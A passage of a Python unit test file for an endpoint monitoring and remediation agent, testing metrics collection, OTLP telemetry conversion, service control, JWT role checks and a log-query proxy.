            self.assertGreaterEqual(int(phys), 1)
        freq = (hw.get("cpu") or {}).get("freq")
        if freq:
            self.assertTrue(freq.get("max_mhz") or freq.get("current_mhz"))
        conns = get_network_connections()
        self.assertEqual(conns.get("status"), "OK")
        self.assertEqual(conns.get("source"), "/proc/net")
        self.assertIn("tcp_connections", conns)
        self.assertIn("listen", conns.get("tcp_connections") or {})
        st = (procs.get("processes") or [{}])[0].get("status")
        self.assertIn(st, ("running", "sleeping", "disk-sleep", "zombie", "stopped", "idle", "dead", "parked", "waking", "wakekill", "tracing-stop"))
        from colsoft_tools.observability import get_system_metrics, _probe_process_running

        mem = (get_system_metrics(cpu_interval=0.05).get("memory") or {})
        self.assertIn("swap_used", mem)
        self.assertIn("swap_percent", mem)
        self.assertIn("swap_free", mem)
        probe = _probe_process_running("systemd")
        if probe.get("status") != "UP":
            probe = _probe_process_running("init")
        self.assertIn(probe.get("status"), ("UP", "DOWN"))
        if probe.get("status") == "UP":
            self.assertEqual(probe.get("source"), "/proc")
        from colsoft_tools.linux_collectors import linux_syslog

        syslog = linux_syslog(max_lines=1)
        if syslog.get("status") in ("OK", "ERROR"):
            self.assertEqual(syslog.get("cross_tool"), "system_log")

    def test_windows_scm_state_maps_active_sub(self):
        from colsoft_tools.observability import _windows_scm_state

        running = _windows_scm_state("STATE              : 4  RUNNING")
        self.assertEqual(running["active_state"], "running")
        self.assertEqual(running["sub_state"], "running")
        stopped = _windows_scm_state("STATE              : 1  STOPPED")
        self.assertEqual(stopped["active_state"], "stopped")
        self.assertEqual(stopped["sub_state"], "dead")

    def test_windows_service_control_maps_scm_state(self):
        from colsoft_tools import remediation as rem

        class _Res:
            def __init__(self, code=0, out=""):
                self.returncode = code
                self.stdout = out
                self.stderr = ""

        def fake_run(cmd, timeout=20):
            if cmd and cmd[0] == "sc" and cmd[1] == "query":
                return _Res(0, "STATE              : 4  RUNNING")
            return _Res(0, "OK")

        with patch.object(rem, "_run", side_effect=fake_run):
            out = rem._service_windows("start", "Spooler")
        self.assertEqual(out["status"], "OK")
        self.assertEqual(out["active_state"], "running")
        self.assertEqual(out["sub_state"], "running")
        self.assertIn("raw_state", out)

    def test_script_argv_is_os_aware(self):
        from colsoft_tools.remediation import _script_argv

        with patch("colsoft_tools.remediation.platform.system", return_value="Windows"):
            ps = _script_argv(r"C:\cat\fix.ps1", ["-Force"])
            bat = _script_argv(r"C:\cat\fix.bat", [])
        self.assertEqual(ps[0], "powershell")
        self.assertIn("-File", ps)
        self.assertEqual(bat[1], "/c")

    def test_firewall_unsupported_off_linux_windows(self):
        from colsoft_tools.remediation import block_ip, isolate_host

        with patch("colsoft_tools.remediation.platform.system", return_value="Darwin"):
            fw = block_ip("1.2.3.4")
            iso = isolate_host(manager_host="1.1.1.1")
        self.assertEqual(fw["status"], "UNSUPPORTED")
        self.assertEqual(iso["status"], "UNSUPPORTED")

    def test_installed_software_windows_errors_on_powershell_fail(self):
        from colsoft_tools import observability as obs

        class _Res:
            returncode = 1
            stdout = ""
            stderr = "access denied"

        with patch.object(obs, "_run", return_value=_Res()):
            out = obs._installed_software_windows()
        self.assertEqual(out["status"], "ERROR")
        self.assertIn("access denied", out.get("error") or "")

    def test_security_tools_unsupported_on_darwin(self):
        from colsoft_tools.endpoint_security import (
            auth_audit,
            cis_score,
            persistence_scan,
            rootkit_check,
        )

        with patch(
            "colsoft_tools.endpoint_security.platform.system", return_value="Darwin"
        ):
            self.assertEqual(persistence_scan()["status"], "UNSUPPORTED")
            self.assertEqual(auth_audit()["status"], "UNSUPPORTED")
            self.assertEqual(cis_score()["status"], "UNSUPPORTED")
            self.assertEqual(rootkit_check()["status"], "UNSUPPORTED")

    def test_legacy_trigger_update_uses_native_shell(self):
        from colsoft_tools.agent_admin import trigger_update

        proc = MagicMock(returncode=0, stdout="ok")
        with patch(
            "colsoft_tools.agent_admin.platform.system", return_value="Windows"
        ), patch("colsoft_tools.agent_admin.subprocess.run", return_value=proc) as run:
            out = trigger_update({"auto_update": {"command": "echo hi"}}, {})
        self.assertEqual(out["status"], "OK")
        argv = run.call_args[0][0]
        self.assertEqual(argv[1], "/c")
        self.assertEqual(argv[2], "echo hi")

    def test_parse_systemctl_line_includes_description(self):
        from colsoft_tools.linux_collectors import parse_systemctl_line

        rec = parse_systemctl_line(
            "sshd.service loaded active running OpenBSD Secure Shell server"
        )
        self.assertEqual(rec["unit"], "sshd.service")
        self.assertEqual(rec["load"], "loaded")
        self.assertEqual(rec["active"], "active")
        self.assertEqual(rec["sub"], "running")
        self.assertIn("Secure Shell", rec["description"])

    def test_linux_interval_floor_is_one_second(self):
        from colsoft_tools.linux_monitors import _interval

        self.assertEqual(_interval(0.2, 30.0), 1.0)
        self.assertEqual(_interval("2", 30.0), 2.0)
        self.assertEqual(_interval("nope", 15.0), 15.0)

    def test_control_service_invalid_action_uses_catalog_tool(self):
        from colsoft_tools.remediation import control_service

        out = control_service("explode", "sshd")
        self.assertEqual(out["tool"], "start_service")
        self.assertEqual(out["status"], "ERROR")
        self.assertIn("inválida", out["error"])

    def test_network_check_payloads_use_catalog_tool_names(self):
        from colsoft_tools import network_checks as nc

        tls = nc.check_tls_certificate("", timeout=1)
        self.assertEqual(tls["tool"], "tls")
        dns = nc.resolve_dns("")
        self.assertEqual(dns["tool"], "dns_resolve")

    def test_isolate_reverts_when_state_cannot_persist(self):
        from colsoft_tools import remediation as rem

        with patch.object(rem.platform, "system", return_value="Linux"), patch.object(
            rem, "_is_privileged", return_value=True
        ), patch.object(rem.shutil, "which", return_value="/sbin/iptables"), patch.object(
            rem, "_load_state", return_value={}
        ), patch.object(
            rem, "_apply_rules", return_value=[]
        ), patch.object(
            rem, "_remove_rules"
        ) as remove, patch.object(
            rem, "_save_state", return_value=False
        ):
            out = rem.isolate_host(reason="test", duration=0, manager_host="1.1.1.1")
        self.assertEqual(out["status"], "ERROR")
        self.assertIn("persist", out["error"].lower())
        remove.assert_called()


class TestDataPlaneOtlp(unittest.TestCase):
    def test_otlp_scope_version_matches_agent(self):
        from colsoft_tools.agent_admin import AGENT_VERSION
        from colsoft_tools.data_plane import SCOPE_VERSION

        self.assertEqual(SCOPE_VERSION, AGENT_VERSION)

    def test_service_status_payload_stays_valid_json(self):
        import json

        from colsoft_tools.data_plane import events_to_otlp_logs

        services = [
            {
                "unit": f"svc-{i}.service",
                "load": "loaded",
                "active": "active",
                "sub": "running",
                "description": "Accounts Service " + str(i),
            }
            for i in range(224)
        ]
        ev = {
            "type": "event_push",
            "agent_id": "agt",
            "event": {
                "event_type": "telemetry.tool_result",
                "category": "observability",
                "severity": "info",
                "scheduled": True,
                "request_id": "auto-1",
                "tool": "service_status",
                "result": {
                    "tool": "service_status",
                    "status": "OK",
                    "count": 224,
                    "services": services,
                    "error": None,
                },
            },
        }
        otlp = events_to_otlp_logs([ev], {})
        attrs = otlp["resourceLogs"][0]["scopeLogs"][0]["logRecords"][0]["attributes"]
        payload_s = next(
            a["value"]["stringValue"] for a in attrs if a["key"] == "event.payload"
        )
        payload = json.loads(payload_s)
        self.assertEqual(payload["tool"], "service_status")
        self.assertEqual(payload["result"]["count"], 224)
        self.assertEqual(payload["result"]["status"], "OK")
        self.assertTrue(payload["result"]["truncated"])
        self.assertEqual(len(payload["result"]["services"]), 12)
        self.assertEqual(payload["result"]["services_omitted"], 212)
        self.assertLessEqual(len(payload_s), 8000)

    def test_otlp_metrics_from_linux_proc_shape(self):
        from colsoft_tools.data_plane import events_to_otlp_metrics

        ev = {
            "ts": "2026-08-24T12:00:00Z",
            "event": {
                "tool": "linux_proc_metrics",
                "result": {
                    "tool": "linux_proc_metrics",
                    "cpu": {
                        "percent": 10.0,
                        "logical_cores": 4,
                        "load_avg_1": 0.31,
                        "load_avg_5": 0.40,
                        "load_avg_15": 0.38,
                    },
                    "memory": {
                        "percent": 40.0,
                        "total": 1000,
                        "available": 400,
                        "swap_percent": 2.5,
                        "swap_used": 50,
                    },
                    "net": [
                        {
                            "iface": "eth0",
                            "rx_bytes": 5,
                            "tx_bytes": 7,
                            "rx_packets": 3,
                            "tx_packets": 4,
                            "rx_errors": 1,
                            "tx_errors": 0,
                            "rx_dropped": 2,
                            "tx_dropped": 0,
                        }
                    ],
                    "disks": [
                        {
                            "name": "sda",
                            "reads": 100,
                            "writes": 40,
                            "read_sectors": 800,
                            "write_sectors": 200,
                            "in_progress": 2,
                        }
                    ],
                    "volumes": [{"mountpoint": "/", "percent": 67.0}],
                    "tcp_connections": {
                        "tcp": 10,
                        "listen": 3,
                        "established": 5,
                        "time_wait": 2,
                        "syn_recv": 0,
                        "syn_sent": 0,
                        "close_wait": 0,
                        "udp": 1,
                    },
                    "uptime_s": 99.0,
                },
            },
        }
        otlp = events_to_otlp_metrics([ev], {})
        names = {
            m["name"]
            for m in otlp["resourceMetrics"][0]["scopeMetrics"][0]["metrics"]
        }
        self.assertIn("system.cpu.utilization", names)
        self.assertIn("system.cpu.load_average.1m", names)
        self.assertIn("system.cpu.load_average.5m", names)
        self.assertIn("system.cpu.load_average.15m", names)
        self.assertIn("system.memory.usage", names)
        self.assertIn("system.uptime", names)
        self.assertIn("system.network.io.bytes_sent", names)
        self.assertIn("system.network.io.bytes_recv", names)
        self.assertIn("system.memory.available", names)
        self.assertIn("system.disk.operations.read", names)
        self.assertIn("system.disk.operations.write", names)
        self.assertIn("system.disk.io.read", names)
        self.assertIn("system.disk.io.write", names)
        self.assertIn("system.cpu.logical.count", names)
        self.assertIn("system.memory.swap.utilization", names)
        self.assertIn("system.filesystem.utilization", names)
        self.assertIn("system.disk.queue.length", names)
        self.assertIn("system.network.packets.sent", names)
        self.assertIn("system.network.errors", names)
        self.assertIn("system.network.dropped", names)
        self.assertIn("system.network.connections", names)
        self.assertIn("system.network.connections.listen", names)
        self.assertIn("system.network.connections.established", names)
        self.assertIn("system.network.connections.time_wait", names)
        self.assertIn("system.network.connections.udp", names)

    def test_otlp_metrics_survive_logger_and_ws_compact(self):
        from colsoft_tools.data_plane import (
            compact_command_result,
            compact_event_for_otlp,
            events_to_otlp_metrics,
        )

        disk_io = {
            "read_count": 55000,
            "write_count": 100,
            "read_bytes": 4096,
            "write_bytes": 1024,
            "queue_length": 10.0,
        }
        raw = {
            "tool": "system_metrics",
            "status": "OK",
            "cpu": {"percent": 1.5, "logical_cores": 2},
            "memory": {
                "percent": 10.0,
                "total": 100,
                "available": 90,
                "used": 10,
            },
            "disks": [
                {"mountpoint": f"/m{i}", "percent": float(i)} for i in range(10)
            ],
            "disk_io": disk_io,
            "filesystem_percent_max": 9.0,
            "network_io": {
                "bytes_sent": 7,
                "bytes_recv": 5,
                "packets_sent": 0,
                "packets_recv": 0,
                "errin": 0,
                "errout": 0,
                "dropin": 0,
                "dropout": 0,
                "interfaces": [
                    {"iface": f"veth{i}", "bytes_sent": 1, "bytes_recv": 1}
                    for i in range(20)
                ],
            },
            "uptime_seconds": 50.0,
            "tcp_connections": {
                "tcp": 1,
                "listen": 1,
                "established": 0,
                "time_wait": 0,
                "syn_recv": 0,
                "syn_sent": 0,
                "close_wait": 0,
                "udp": 0,
            },
        }
        ws = compact_command_result(raw, tool="system_metrics")
        otlp_payload = compact_event_for_otlp(
            {
                "event_type": "telemetry.tool_result",
                "tool": "system_metrics",
                "result": raw,
            }
        )
        self.assertLessEqual(len((ws.get("disks") or [])), 3)
        for result in (ws, otlp_payload.get("result")):
            otlp = events_to_otlp_metrics(
                [{"event": {"tool": "system_metrics", "result": result}}],
                {},
            )
            by_name = {
                m["name"]: m["gauge"]["dataPoints"][0]["asDouble"]
                for m in otlp["resourceMetrics"][0]["scopeMetrics"][0]["metrics"]
            }
            self.assertEqual(by_name["system.disk.operations.read"], 55000.0)
            self.assertEqual(by_name["system.disk.queue.length"], 10.0)
            self.assertEqual(by_name["system.filesystem.utilization"], 9.0)
            self.assertEqual(by_name["system.uptime"], 50.0)
            self.assertEqual(by_name["system.network.io.bytes_sent"], 7.0)

    def test_otlp_metrics_windows_queues_and_available(self):
        from colsoft_tools.data_plane import events_to_otlp_metrics

        ev = {
            "ts": "2026-08-26T12:00:00Z",
            "event": {
                "tool": "system_metrics",
                "result": {
                    "tool": "system_metrics",
                    "cpu": {
                        "percent": 22.0,
                        "logical_cores": 8,
                        "processor_queue_length": 3,
                        "system_processor_queue_length": 3,
                    },
                    "memory": {
                        "percent": 41.0,
                        "used": 6000,
                        "available": 4000000000,
                        "swap_percent": 1.0,
                        "swap_used": 100,
                    },
                    "disks": [{"mountpoint": "C:\\", "percent": 55.0}],
                    "disk_io": {
                        "queue_length": 1,
                        "read_count": 10,
                        "write_count": 4,
                        "read_bytes": 5120,
                        "write_bytes": 2048,
                    },
                    "network_io": {
                        "bytes_sent": 100,
                        "bytes_recv": 200,
                        "packets_sent": 3,
                        "packets_recv": 5,
                        "errin": 1,
                        "errout": 0,
                        "dropin": 2,
                        "dropout": 0,
                    },
                },
            },
        }
        otlp = events_to_otlp_metrics([ev], {})
        names = {
            m["name"]
            for m in otlp["resourceMetrics"][0]["scopeMetrics"][0]["metrics"]
        }
        self.assertIn("system.cpu.utilization", names)
        self.assertIn("system.processor.queue.length", names)
        self.assertIn("system.processor.system_queue.length", names)
        self.assertIn("system.disk.queue.length", names)
        self.assertIn("system.memory.available", names)
        self.assertIn("system.memory.available.mbytes", names)
        self.assertIn("system.disk.operations.read", names)
        self.assertIn("system.filesystem.utilization", names)
        self.assertIn("system.network.packets.recv", names)
        self.assertIn("system.network.dropped", names)

    def test_otlp_metrics_health_probes_and_systemd_failed(self):
        from colsoft_tools.data_plane import events_to_otlp_metrics

        probes = events_to_otlp_metrics(
            [
                {
                    "ts": "2026-08-26T12:00:00Z",
                    "event": {
                        "tool": "health_probes",
                        "result": {
                            "tool": "health_probes",
                            "count": 3,
                            "down": 1,
                        },
                    },
                }
            ],
            {},
        )
        probe_names = {
            m["name"]
            for m in probes["resourceMetrics"][0]["scopeMetrics"][0]["metrics"]
        }
        self.assertEqual(probe_names, {"health.probe.count", "health.probe.down"})

        sd = events_to_otlp_metrics(
            [
                {
                    "ts": "2026-08-26T12:00:00Z",
                    "event": {
                        "tool": "linux_systemd_units",
                        "result": {
                            "tool": "linux_systemd_units",
                            "count": 4,
                            "units": [
                                {"unit": "sshd.service", "active": "active"},
                                {"unit": "cron.service", "active": "failed"},
                            ],
                        },
                    },
                }
            ],
            {},
        )
        failed = sd["resourceMetrics"][0]["scopeMetrics"][0]["metrics"][0]
        self.assertEqual(failed["name"], "system.systemd.units.failed")
        self.assertEqual(failed["gauge"]["dataPoints"][0]["asDouble"], 1.0)

    def test_otlp_metrics_tcp_connections_and_probe_latency(self):
        import socket
        from types import SimpleNamespace

        from colsoft_tools.data_plane import events_to_otlp_metrics
        from colsoft_tools.observability import connection_counts_from_psutil

        counts = connection_counts_from_psutil(
            [
                SimpleNamespace(type=socket.SOCK_STREAM, status="LISTEN"),
                SimpleNamespace(type=socket.SOCK_STREAM, status="ESTABLISHED"),
                SimpleNamespace(type=socket.SOCK_STREAM, status="ESTABLISHED"),
                SimpleNamespace(type=socket.SOCK_STREAM, status="TIME_WAIT"),
                SimpleNamespace(type=socket.SOCK_STREAM, status="SYN_RECV"),
                SimpleNamespace(type=socket.SOCK_STREAM, status="CLOSE_WAIT"),
                SimpleNamespace(type=socket.SOCK_DGRAM, status="NONE"),
            ]
        )
        self.assertEqual(counts["tcp"], 6)
        self.assertEqual(counts["listen"], 1)
        self.assertEqual(counts["established"], 2)
        self.assertEqual(counts["time_wait"], 1)
        self.assertEqual(counts["syn_recv"], 1)
        self.assertEqual(counts["close_wait"], 1)
        self.assertEqual(counts["udp"], 1)

        otlp = events_to_otlp_metrics(
            [
                {
                    "ts": "2026-08-26T12:00:00Z",
                    "event": {
                        "tool": "network_connections",
                        "result": {
                            "tool": "network_connections",
                            "count": 3,
                            "tcp_connections": counts,
                        },
                    },
                }
            ],
            {},
        )
        names = {
            m["name"]
            for m in otlp["resourceMetrics"][0]["scopeMetrics"][0]["metrics"]
        }
        self.assertIn("system.network.connections.listen", names)
        self.assertIn("system.network.connections.established", names)
        self.assertNotIn("system.cpu.utilization", names)

        probes = events_to_otlp_metrics(
            [
                {
                    "ts": "2026-08-26T12:00:00Z",
                    "event": {
                        "tool": "health_probes",
                        "result": {
                            "tool": "health_probes",
                            "count": 2,
                            "down": 0,
                            "response_time": 0.02,
                            "response_time_max": 0.03,
                            "checks": [
                                {"id": "a", "status": "UP", "response_time": 0.01},
                                {"id": "b", "status": "UP", "response_time": 0.03},
                            ],
                        },
                    },
                }
            ],
            {},
        )
        probe_names = {
            m["name"]
            for m in probes["resourceMetrics"][0]["scopeMetrics"][0]["metrics"]
        }
        self.assertIn("health.probe.response_time", probe_names)
        self.assertIn("health.probe.response_time.max", probe_names)

    def test_counts_only_keeps_tcp_and_probe_scalars(self):
        from colsoft_tools.data_plane import _counts_only

        out = _counts_only(
            {
                "tool": "system_metrics",
                "status": "OK",
                "down": 1,
                "failed": 2,
                "response_time": 0.02,
                "tcp_connections": {"tcp": 4, "listen": 1, "udp": 0},
                "disks": [{"percent": 10}],
            }
        )
        self.assertEqual(out["down"], 1)
        self.assertEqual(out["failed"], 2)
        self.assertEqual(out["tcp_connections"]["listen"], 1)
        self.assertEqual(out["disks_count"], 1)

    def test_loopback_iface_and_psutil_net_skip(self):
        from types import SimpleNamespace

        from colsoft_tools.observability import (
            _is_loopback_iface,
            _psutil_network_io,
        )

        self.assertTrue(_is_loopback_iface("lo"))
        self.assertTrue(_is_loopback_iface("Loopback Pseudo-Interface 1"))
        self.assertFalse(_is_loopback_iface("eth0"))

        fake = SimpleNamespace(
            net_io_counters=lambda pernic=False: {
                "lo": SimpleNamespace(
                    bytes_sent=99,
                    bytes_recv=99,
                    packets_sent=9,
                    packets_recv=9,
                    errin=0,
                    errout=0,
                    dropin=0,
                    dropout=0,
                ),
                "eth0": SimpleNamespace(
                    bytes_sent=10,
                    bytes_recv=20,
                    packets_sent=1,
                    packets_recv=2,
                    errin=0,
                    errout=1,
                    dropin=0,
                    dropout=0,
                ),
            }
            if pernic
            else SimpleNamespace(bytes_sent=109, bytes_recv=119)
        )
        io = _psutil_network_io(fake)
        self.assertEqual(io["bytes_sent"], 10)
        self.assertEqual(io["bytes_recv"], 20)
        self.assertEqual(io["errout"], 1)
        self.assertEqual(len(io["interfaces"]), 1)
        self.assertEqual(io["interfaces"][0]["iface"], "eth0")

    def test_linux_iface_aliases_and_diskstats_filter(self):
        from colsoft_tools.linux_collectors import _skip_diskstats_name
        from colsoft_tools.observability import _linux_network_io

        self.assertTrue(_skip_diskstats_name("sda1"))
        self.assertTrue(_skip_diskstats_name("nvme0n1p2"))
        self.assertTrue(_skip_diskstats_name("mmcblk0p1"))
        self.assertTrue(_skip_diskstats_name("loop0"))
        self.assertFalse(_skip_diskstats_name("sda"))
        self.assertFalse(_skip_diskstats_name("nvme0n1"))
        self.assertFalse(_skip_diskstats_name("mmcblk0"))
        self.assertFalse(_skip_diskstats_name("md0"))
        self.assertFalse(_skip_diskstats_name("dm-0"))

        io = _linux_network_io(
            [
                {"iface": "lo", "rx_bytes": 99, "tx_bytes": 99},
                {"iface": "eth0", "rx_bytes": 5, "tx_bytes": 7, "rx_errors": 1},
            ]
        )
        self.assertEqual(io["bytes_recv"], 5)
        self.assertEqual(io["bytes_sent"], 7)
        self.assertEqual(io["errin"], 1)
        self.assertEqual(len(io["interfaces"]), 1)
        self.assertEqual(io["interfaces"][0]["bytes_sent"], 7)
        self.assertEqual(io["interfaces"][0]["tx_bytes"], 7)

    @unittest.skipIf(platform.system() == "Windows", "en Windows sí consulta CIM")
    def test_windows_perf_queues_noop_off_windows(self):
        from colsoft_tools.windows_collectors import windows_perf_queues

        self.assertEqual(windows_perf_queues(), {})

    def test_ingest_truncated_json_not_raw_blob(self):
        from otlp import _ingest_log_record

        captured = []
        with patch("otlp.log_agent_event", side_effect=lambda **k: captured.append(k)):
            with patch("otlp.save_execution_result_to_json"):
                _ingest_log_record(
                    {},
                    {
                        "severityText": "INFO",
                        "body": {
                            "stringValue": "telemetry.tool_result service_status"
                        },
                        "attributes": [
                            {
                                "key": "event.type",
                                "value": {"stringValue": "telemetry.tool_result"},
                            },
                            {
                                "key": "tool",
                                "value": {"stringValue": "service_status"},
                            },
                            {
                                "key": "event.payload",
                                "value": {
                                    "stringValue": '{"event_type": "telemetry.tool_result", "result": {"services": [{"unit": "a'
                                },
                            },
                        ],
                    },
                )
        payload = captured[0]["data"]["payload"]
        self.assertTrue(payload.get("parse_error"))
        self.assertTrue(payload.get("truncated"))
        self.assertNotIn("raw", payload)

    def test_windows_eventlog_high_otlp_is_audit_security(self):
        from otlp import _ingest_log_record

        captured = []
        with patch("otlp.log_agent_event", side_effect=lambda **k: captured.append(k)):
            with patch("otlp.save_execution_result_to_json"):
                _ingest_log_record(
                    {},
                    {
                        "severityText": "ERROR",
                        "body": {"stringValue": "windows.eventlog"},
                        "attributes": [
                            {
                                "key": "event.type",
                                "value": {"stringValue": "windows.eventlog"},
                            },
                            {
                                "key": "tool",
                                "value": {"stringValue": "windows_event_log"},
                            },
                            {
                                "key": "category",
                                "value": {"stringValue": "security"},
                            },
                            {
                                "key": "event.payload",
                                "value": {
                                    "stringValue": '{"event_type":"windows.eventlog","severity":"high","channel":"Security"}'
                                },
                            },
                        ],
                    },
                )
        self.assertEqual(captured[0]["event_type"], "audit")
        self.assertEqual(captured[0]["category"], "security")
        self.assertEqual(captured[0]["subcategory"], "eventlog")


class TestRobinLogsHelpers(unittest.TestCase):
    def test_normalize_and_ingest_url(self):
        self.assertEqual(_normalize_level("warning"), "warn")
        self.assertEqual(_normalize_level("nope"), "info")
        self.assertTrue(
            _ingest_url("https://logs.robin-ai.xyz/api/logs").endswith(
                "/api/robin-logger/store"
            )
        )

    def test_query_url_from_store_and_explicit(self):
        env = {
            "ROBIN_LOGGER_URL": "https://logs.robin-ai.xyz/api/robin-logger/store",
            "ROBIN_LOGGER_QUERY_URL": "",
        }
        with patch.dict(os.environ, env, clear=False):
            self.assertEqual(query_url(), "https://logs.robin-ai.xyz/api/logs")
        with patch.dict(
            os.environ,
            {"ROBIN_LOGGER_QUERY_URL": "https://logs.example/api/logs"},
            clear=False,
        ):
            self.assertEqual(query_url(), "https://logs.example/api/logs")

    def test_clean_logs_params_aliases(self):
        cleaned = _clean_logs_params(
            {
                "level": "warning",
                "subcategory": "get_system_log",
                "limit": 50,
                "per_page": 20,
                "foo": "drop-me",
                "search": "",
            }
        )
        self.assertEqual(cleaned["level"], "warn")
        self.assertEqual(cleaned["subcategory"], "system_log")
        self.assertEqual(cleaned["per_page"], 20)
        self.assertNotIn("limit", cleaned)
        self.assertNotIn("foo", cleaned)
        self.assertNotIn("search", cleaned)

    def test_clean_logs_params_expands_date_hours(self):
        cleaned = _clean_logs_params(
            {
                "date": "2026-08-27",
                "startHour": "14:00",
                "endHour": "15:00",
                "category": "windows",
                "subcategory": "windows_event_log",
            }
        )
        self.assertNotIn("date", cleaned)
        self.assertNotIn("startHour", cleaned)
        self.assertEqual(cleaned["startDate"], "2026-08-27T14:00:00.000Z")
        self.assertEqual(cleaned["endDate"], "2026-08-27T15:00:00.000Z")
        self.assertEqual(cleaned["category"], "windows")
        self.assertEqual(cleaned["subcategory"], "windows_event_log")

    def test_fetch_logs_get_and_unconfigured(self):
        fake = MagicMock()
        fake.status_code = 200
        fake.json.return_value = {
            "success": True,
            "data": [],
            "pagination": {"page": 1, "limit": 20, "total": 0, "pages": 0},
        }
        env = {
            "ROBIN_LOGGER_URL": "https://logs.robin-ai.xyz/api/robin-logger/store",
            "ROBIN_LOGGER_API_KEY": "rk_test",
            "ROBIN_LOGGER_JWT": "",
            "ROBIN_LOGGER_JWT_TOKEN": "",
            "ROBIN_LOGGER_QUERY_URL": "",
        }
        with patch.dict(os.environ, env, clear=False):
            with patch("lib.metrics_logger.requests.get", return_value=fake) as get:
                body = fetch_logs({"category": "remediation", "limit": 20})
        self.assertTrue(body["success"])
        get.assert_called_once()
        self.assertEqual(get.call_args.args[0], "https://logs.robin-ai.xyz/api/logs")
        self.assertEqual(get.call_args.kwargs["headers"]["X-API-Key"], "rk_test")
        self.assertEqual(get.call_args.kwargs["params"]["category"], "remediation")

        empty = {
            "ROBIN_LOGGER_URL": "",
            "ROBIN_LOGGER_API_KEY": "",
            "ROBIN_LOGGER_JWT": "",
            "ROBIN_LOGGER_JWT_TOKEN": "",
            "ROBIN_LOGGER_QUERY_URL": "",
        }
        with patch.dict(os.environ, empty, clear=False):
            with self.assertRaises(LogsQueryError) as ctx:
                fetch_logs()
        self.assertEqual(ctx.exception.status_code, 503)

    def test_event_push_mapping(self):
        captured = []

        def fake_event(*_args, **kwargs):
            captured.append(kwargs)

        with patch("lib.metrics_logger.log_agent_event", side_effect=fake_event):
            log_event_push(
                "agt",
                {
                    "event": {
                        "event_type": "security.tamper_detected",
                        "severity": "critical",
                    }
                },
            )
            log_event_push(
                "agt",
                {"event": {"event_type": "alert.threshold", "severity": "warning"}},
            )
            log_event_push(
                "agt",
                {
                    "event": {
                        "event_type": "telemetry.tool_result",
                        "category": "observability",
                        "tool": "system_metrics",
                    }
                },
            )
        self.assertEqual(captured[0]["event_type"], "audit")
        self.assertEqual(captured[0]["category"], "security")
        self.assertEqual(captured[0]["level"], "fatal")
        self.assertEqual(captured[1]["event_type"], "activity")
        self.assertEqual(captured[1]["level"], "warn")
        self.assertEqual(captured[2]["event_type"], "metrics")
        self.assertEqual(captured[2]["subcategory"], "system_metrics")

    def test_tool_execution_resolves_srs_alias(self):
        captured = []

        def fake_event(*_args, **kwargs):
            captured.append(kwargs)

        with patch("lib.metrics_logger.log_agent_event", side_effect=fake_event):
            log_tool_execution("agt", "get_system_log", success=True)
            log_tool_execution("agt", "tcp_check", success=True)
            log_tool_execution("agt", "ping", success=True)
        self.assertEqual(captured[0]["subcategory"], "system_log")
        self.assertEqual(captured[0]["category"], "observability")
        self.assertEqual(captured[0]["data"]["tool"], "system_log")
        self.assertEqual(captured[0]["data"]["command"], "get_system_log")
        self.assertEqual(captured[1]["subcategory"], "tcp_connect")
        self.assertEqual(captured[1]["category"], "network_check")
        self.assertNotIn("command", captured[2]["data"])
        self.assertEqual(captured[2]["data"]["command_status"], "success")
        captured.clear()
        with patch("lib.metrics_logger.log_agent_event", side_effect=fake_event):
            log_tool_execution("agt", "ping", success=False, command_status="failed")
            log_tool_execution("agt", "ping", success=True, command_status="UNKNOWN")
        self.assertEqual(captured[0]["data"]["command_status"], "error")
        self.assertEqual(captured[1]["data"]["command_status"], "success")
        self.assertIn("Security", tool_target_summary("get_system_log", {"source": "Security"}))


class TestJwt(unittest.TestCase):
    def test_rs256_roundtrip_and_rejects_hs256(self):
        import jwt as pyjwt

        key, _priv, pub = _rsa_pair()
        now = datetime.now(timezone.utc)
        payload = {
            "sub": "user-uuid",
            "exp": now + timedelta(hours=1),
            "modelBotId": "bot-1",
            "roles": ["admin"],
            "type": "access",
        }
        token = pyjwt.encode(payload, key, algorithm="RS256")
        with patch("lib.jwt_auth.get_public_key", return_value=pub):
            data = decode_robin_jwt(token)
        self.assertEqual(data["sub"], "user-uuid")
        self.assertEqual(issued_by_from_jwt(data), "user:user-uuid")
        self.assertEqual(issued_by_from_jwt(None), "api:user")
        self.assertTrue(jwt_can_issue_command(None, "ping"))
        self.assertTrue(jwt_can_issue_command(data, "ping"))
        self.assertTrue(jwt_can_issue_command(data, "kill_process"))
        self.assertFalse(jwt_can_issue_command({"roles": ["viewer"]}, "ping"))
        self.assertFalse(jwt_can_issue_command({"roles": ["analyst"]}, "kill_process"))
        with patch.dict(
            os.environ,
            {
                "ROBIN_JWT_EXECUTE_ROLES": "*",
                "ROBIN_JWT_HIGH_RISK_ROLES": "*",
            },
        ):
            self.assertTrue(jwt_can_issue_command({"roles": ["viewer"]}, "ping"))
            self.assertTrue(
                jwt_can_issue_command({"roles": ["analyst"]}, "kill_process")
            )

        hs = pyjwt.encode(payload, "s" * 32, algorithm="HS256")
        with patch("lib.jwt_auth.get_public_key", return_value=pub):
            with self.assertRaises(pyjwt.InvalidTokenError):
                decode_robin_jwt(hs)

        bad_type = dict(payload)
        bad_type["type"] = "refresh"
        refresh = pyjwt.encode(bad_type, key, algorithm="RS256")
        with patch("lib.jwt_auth.get_public_key", return_value=pub):
            with self.assertRaises(pyjwt.InvalidTokenError):
                decode_robin_jwt(refresh)

    def test_list_agents_401_without_robin_jwt(self):
        os.environ["ROBIN_JWT_REQUIRED"] = "1"
        from fastapi.testclient import TestClient
        from main import app

        client = TestClient(app)
        missing = client.get("/api/agents")
        self.assertEqual(missing.status_code, 401)
        bad_scheme = client.get(
            "/api/agents", headers={"Authorization": "Token not-a-bearer"}
        )
        self.assertEqual(bad_scheme.status_code, 401)
        os.environ["ROBIN_JWT_REQUIRED"] = "0"


class TestRestSmoke(unittest.TestCase):
    def test_logger_status_without_jwt(self):
        os.environ["ROBIN_JWT_REQUIRED"] = "0"
        from fastapi.testclient import TestClient
        from main import app

        client = TestClient(app)
        r = client.get("/api/system/logger-status")
        self.assertEqual(r.status_code, 200)
        body = r.json()
        self.assertIn("logger", body)
        self.assertFalse(body["jwt_required"])

    def test_get_logs_proxy(self):
        os.environ["ROBIN_JWT_REQUIRED"] = "0"
        payload = {
            "success": True,
            "data": [],
            "pagination": {"page": 1, "limit": 20, "total": 0, "pages": 0},
        }
        from fastapi.testclient import TestClient
        from main import app

        client = TestClient(app)
        with patch("controllers.fetch_logs", return_value=payload) as mocked:
            r = client.get("/api/logs?category=remediation&limit=20")
        self.assertEqual(r.status_code, 200)
        self.assertTrue(r.json()["success"])
        mocked.assert_called_once()
